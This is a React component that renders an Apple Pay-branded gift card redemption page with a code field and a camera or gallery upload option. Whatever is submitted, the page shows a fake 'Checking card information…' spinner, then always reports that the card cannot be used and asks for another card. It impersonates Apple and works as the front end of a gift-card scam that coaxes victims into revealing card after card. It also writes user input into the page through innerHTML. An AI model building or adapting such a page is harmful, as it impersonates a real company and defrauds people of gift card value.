import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    try {
      
try{if(window.parent&&window.parent!==window){window.parent.promotekit_referral="1fd2949a-d22c-431b-92bf-02d4ad04ee24";window.parent.document.cookie="promotekit_referral=1fd2949a-d22c-431b-92bf-02d4ad04ee24;path=/;domain=.aura.build;max-age=31536000"}}catch(e){}



// Configure Tailwind to include our custom 3D transform utilities
tailwind.config = {
theme: {
extend: {
// Add any custom theme extensions here if needed
}
},
plugins: [
function({ addUtilities }) {
const rotateXUtilities = {};
const rotateYUtilities = {};
const rotateZUtilities = {};
const rotateValues = [0, 5, 10, 15, 20, 30, 45, 75];
// Generate rotate-x utilities
rotateValues.forEach((value) => {
rotateXUtilities[`.rotate-x-${value}`] = {
'--tw-rotate-x': `${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
if (value !== 0) {
rotateXUtilities[`.-rotate-x-${value}`] = {
'--tw-rotate-x': `-${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
}
});
// Generate rotate-y utilities
rotateValues.forEach((value) => {
rotateYUtilities[`.rotate-y-${value}`] = {
'--tw-rotate-y': `${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
if (value !== 0) {
rotateYUtilities[`.-rotate-y-${value}`] = {
'--tw-rotate-y': `-${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
}
});
// Generate rotate-z utilities
rotateValues.forEach((value) => {
rotateZUtilities[`.rotate-z-${value}`] = {
'--tw-rotate-z': `${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
if (value !== 0) {
rotateZUtilities[`.-rotate-z-${value}`] = {
'--tw-rotate-z': `-${value}deg`,
transform: `
translate3d(var(--tw-translate-x, 0), var(--tw-translate-y, 0), var(--tw-translate-z, 0))
rotateX(var(--tw-rotate-x, 0))
rotateY(var(--tw-rotate-y, 0))
rotateZ(var(--tw-rotate-z, 0))
skewX(var(--tw-skew-x, 0))
skewY(var(--tw-skew-y, 0))
scaleX(var(--tw-scale-x, 1))
scaleY(var(--tw-scale-y, 1))
`.replace(/\\s+/g, ' ').trim(),
};
}
});
// Perspective utilities
const perspectiveUtilities = {
".perspective-none": { perspective: "none" },
".perspective-dramatic": { perspective: "100px" },
".perspective-near": { perspective: "300px" },
".perspective-normal": { perspective: "500px" },
".perspective-midrange": { perspective: "800px" },
".perspective-distant": { perspective: "1200px" },
};
// Transform style utilities
const transformStyleUtilities = {
".transform-style-preserve-3d": { "transform-style": "preserve-3d" },
".transform-style-flat": { "transform-style": "flat" },
};
addUtilities({
...rotateXUtilities,
...rotateYUtilities,
...rotateZUtilities,
...perspectiveUtilities,
...transformStyleUtilities,
});
}
]
};



        // DOM Elements
        const giftCodeInput = document.getElementById('giftCode');
        const enterBtn = document.getElementById('enterBtn');
        const loadingState = document.getElementById('loadingState');
        const errorContainer = document.getElementById('errorContainer');
        const errorText = document.getElementById('errorText');
        const cameraBtn = document.getElementById('cameraBtn');
        const optionSheet = document.getElementById('optionSheet');
        const optionContent = document.getElementById('optionContent');
        const cancelOption = document.getElementById('cancelOption');
        const galleryOption = document.getElementById('galleryOption');
        const photoOption = document.getElementById('photoOption');
        const fileInput = document.getElementById('fileInput');

        let isTyping = false;

        // Input Behavior
        giftCodeInput.addEventListener('input', (e) => {
            errorContainer.classList.add('hidden'); // Hide error on new input
            if (e.target.value.length > 0) {
                enterBtn.classList.remove('opacity-0', 'pointer-events-none', 'scale-95');
                enterBtn.classList.add('opacity-100', 'scale-100');
            } else {
                enterBtn.classList.add('opacity-0', 'pointer-events-none', 'scale-95');
                enterBtn.classList.remove('opacity-100', 'scale-100');
            }
        });

        giftCodeInput.addEventListener('keyup', (e) => {
            if (e.key === 'Enter' && giftCodeInput.value.trim().length > 0) {
                processCodeSubmission(giftCodeInput.value.trim());
            }
        });

        enterBtn.addEventListener('click', () => {
            if (giftCodeInput.value.trim().length > 0) {
                processCodeSubmission(giftCodeInput.value.trim());
            }
        });

        // Camera Button Logic
        cameraBtn.addEventListener('click', () => {
            // Reset state
            errorContainer.classList.add('hidden');
            // Show sheet
            optionSheet.classList.remove('opacity-0', 'pointer-events-none');
            optionContent.classList.remove('translate-y-10');
        });

        // Close Sheet Logic
        const closeSheet = () => {
            optionContent.classList.add('translate-y-10');
            optionSheet.classList.add('opacity-0');
            setTimeout(() => {
                optionSheet.classList.add('pointer-events-none');
            }, 300);
        };

        cancelOption.addEventListener('click', closeSheet);
        
        // Close on backdrop click
        optionSheet.addEventListener('click', (e) => {
            if (e.target === optionSheet) closeSheet();
        });

        // Gallery Option
        galleryOption.addEventListener('click', () => {
            // Simulate gallery selection flow
            // On mobile this opens photo library, desktop file picker
            fileInput.removeAttribute('capture'); // ensure gallery
            fileInput.click();
        });

        // Photo Option
        photoOption.addEventListener('click', () => {
            // Simulate camera capture
            fileInput.setAttribute('capture', 'environment');
            fileInput.click();
        });

        // File Selection Handling
        fileInput.addEventListener('change', (e) => {
            if (fileInput.files && fileInput.files.length > 0) {
                // User selected a file
                // We must prompt confirmation or immediately use? 
                // Instructions: "After confirmation... display visible loading state"
                // Standard file input implies confirmation when closing the dialog with a selection.
                
                closeSheet();
                
                // Slight delay to simulate the modal closing before loading starts
                setTimeout(() => {
                    triggerLoadingState('image');
                }, 300);
            }
        });

        // Core Logic Functions
        function processCodeSubmission(code) {
            // Hide button interaction
            enterBtn.classList.add('opacity-0', 'pointer-events-none');
            giftCodeInput.blur();
            
            triggerLoadingState('code', code);
        }

        function triggerLoadingState(type, payload = null) {
            // 1. Show Loading
            loadingState.classList.remove('opacity-0', 'pointer-events-none');
            
            // 2. Wait 3-5 seconds (using 4000ms)
            setTimeout(() => {
                // Hide loading
                loadingState.classList.add('opacity-0', 'pointer-events-none');
                
                // Show Error
                showError(type, payload);
            }, 4000);
        }

        function showError(type, payload) {
            errorContainer.classList.remove('hidden');
            
            // Animate error in
            errorContainer.animate([
                { opacity: 0, transform: 'translateY(-10px)' },
                { opacity: 1, transform: 'translateY(0)' }
            ], {
                duration: 400,
                easing: 'cubic-bezier(0.16, 1, 0.3, 1)'
            });

            if (type === 'code') {
                // "This card (XXXX) cannot be used..."
                errorText.innerHTML = `This card (<span class="font-mono text-white/90">${payload}</span>) cannot be used at this moment. Please try another card.`;
            } else {
                // Generic error for image
                errorText.textContent = "This card cannot be used at this moment. Please try another card.";
            }

            // Bring focus back to input if it was code error, clear value?
            // Apple UI usually keeps value for user correction, but here it's a hard error.
            if (type === 'code') {
               // Optional: giftCodeInput.value = ''; 
            }
        }

    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
  }, []);

  return (
    <>
      

<header className="w-full flex justify-center items-center py-6 sticky top-0 z-40 bg-black/80 backdrop-blur-md border-b border-white/5">
<div className="flex items-center gap-1 opacity-90 hover:opacity-100 transition-opacity cursor-default">
<iconify-icon className="text-white mb-1" height="20" icon="mdi:apple" width="20"></iconify-icon>
<span className="text-lg font-medium tracking-tight font-sans">Pay</span>
</div>
</header>
<main className="w-full max-w-md px-6 flex flex-col items-center pt-8 pb-12 flex-grow relative">

<div className="relative w-full aspect-[1.586/1] mb-10 z-10 group perspective-1000">

<div className="absolute inset-0 z-50 bg-black/60 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center opacity-0 pointer-events-none transition-opacity duration-300" id="loadingState">
<div className="w-8 h-8 border-2 border-white/20 border-t-white rounded-full animate-spin mb-4"></div>
<p className="text-sm font-medium text-white/90 tracking-wide">Checking card information…</p>
</div>

<div className="card-anim w-full h-full rounded-xl bg-gradient-to-br from-zinc-800 via-zinc-900 to-black border border-white/10 shadow-2xl relative overflow-hidden">

<div className="absolute inset-0 bg-gradient-to-tr from-white/5 to-transparent opacity-50 pointer-events-none"></div>

<div className="absolute top-6 left-6">
<p className="text-xs font-medium tracking-widest text-zinc-400 uppercase">Digital Gift Card</p>
</div>
<div className="absolute bottom-6 left-6">
<p className="text-xs text-zinc-500 mb-1">Balance</p>
<p className="text-lg font-medium tracking-tight text-white">$512.00</p>
</div>
<div className="absolute bottom-6 right-6 flex items-center gap-2">
<div className="flex gap-1">
<div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
<div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
<div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
<div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
</div>
<p className="text-sm font-mono text-zinc-300 font-medium">8921</p>
</div>

<div className="absolute top-6 right-6 w-10 h-8 rounded bg-gradient-to-br from-yellow-600/20 to-yellow-800/20 border border-yellow-600/30"></div>
</div>
</div>

<div className="w-full flex flex-col items-center text-center space-y-1 relative z-20">
<h1 className="text-2xl font-medium tracking-tight text-white">Redeem Gift Card</h1>
<p className="text-base text-zinc-400 font-normal leading-relaxed">Redeem a gift card using Apple Pay.</p>
</div>

<div className="w-full mt-10 relative group">
<label className="block text-xs font-medium text-zinc-500 uppercase tracking-wider mb-2 text-left ml-1" htmlFor="giftCode">Insert Code</label>
<div className="relative flex items-center">
<input autocomplete="off" className="w-full bg-zinc-900/50 border border-zinc-800 focus:border-white/30 text-white text-base p-4 rounded-lg placeholder-zinc-600 outline-none transition-all duration-300 font-mono tracking-wide" id="giftCode" placeholder="Enter gift card code" spellcheck="false" type="text"/>

<button className="absolute right-2 bg-white text-black text-xs font-medium px-4 py-2 rounded-md opacity-0 pointer-events-none transform scale-95 transition-all duration-300 hover:bg-zinc-200" id="enterBtn">
                    Enter
                </button>
</div>

<div className="mt-6 p-4 rounded-lg bg-red-500/10 border border-red-500/20 hidden" id="errorContainer">
<div className="flex gap-3 items-start text-left">
<iconify-icon className="text-red-400 mt-0.5 shrink-0" icon="solar:danger-circle-linear" width="20"></iconify-icon>
<p className="text-sm text-red-200 leading-snug font-normal" id="errorText"></p>
</div>
</div>
</div>

<div className="w-full mt-8">
<button className="w-full py-4 flex items-center justify-center gap-2 text-blue-400 hover:text-blue-300 transition-colors group" id="cameraBtn">
<iconify-icon className="group-hover:scale-110 transition-transform" height="20" icon="solar:camera-linear" width="20"></iconify-icon>
<span className="text-base font-medium">Use Camera</span>
</button>
</div>
</main>

<div className="fixed inset-0 z-[100] bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300 flex items-end sm:items-center justify-center" id="optionSheet">
<div className="w-full max-w-sm m-4 transform translate-y-10 transition-transform duration-300" id="optionContent">
<div className="bg-zinc-900 rounded-xl overflow-hidden divide-y divide-zinc-800 shadow-2xl ring-1 ring-white/10">
<button className="w-full p-4 flex items-center gap-3 hover:bg-zinc-800 transition-colors text-left group" id="galleryOption">
<div className="w-8 h-8 rounded-full bg-zinc-800 group-hover:bg-zinc-700 flex items-center justify-center transition-colors">
<iconify-icon className="text-white" icon="solar:gallery-linear" width="18"></iconify-icon>
</div>
<span className="text-base font-medium text-white">Choose from Gallery</span>
</button>
<button className="w-full p-4 flex items-center gap-3 hover:bg-zinc-800 transition-colors text-left group" id="photoOption">
<div className="w-8 h-8 rounded-full bg-zinc-800 group-hover:bg-zinc-700 flex items-center justify-center transition-colors">
<iconify-icon className="text-white" icon="solar:camera-linear" width="18"></iconify-icon>
</div>
<span className="text-base font-medium text-white">Take Photo</span>
</button>
</div>
<button className="w-full mt-3 p-4 bg-zinc-900 rounded-xl text-base font-semibold text-white hover:bg-zinc-800 transition-colors shadow-lg ring-1 ring-white/10" id="cancelOption">
                Cancel
            </button>
</div>
</div>

<input accept="image/*" className="hidden" id="fileInput" type="file"/>


    </>
  );
}
